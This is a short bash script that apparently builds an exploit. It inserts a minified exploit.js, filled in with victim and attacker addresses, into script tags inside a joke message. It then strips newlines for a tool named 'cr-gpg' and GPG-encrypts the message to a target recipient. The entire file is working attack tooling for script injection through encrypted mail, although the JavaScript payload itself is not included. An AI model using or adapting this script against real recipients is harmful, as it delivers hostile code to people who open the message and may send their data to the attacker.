#!/bin/bash
IP=$1
ATTACKER=$2
TARGET=$3
echo -n " hey I just met you <script>" > exploit.txt
cat exploit.js | sed "s/__ip__/$IP/" | sed "s/__attacker__/$ATTACKER/" | jsmin >> exploit.txt
echo -n "</script> and this is crazy! " >> exploit.txt
# cause cr-gpg does not like new lines
cat exploit.txt | tr -d '\n' | gpg -e --armor -r $TARGET --output send-to.$TARGET.txt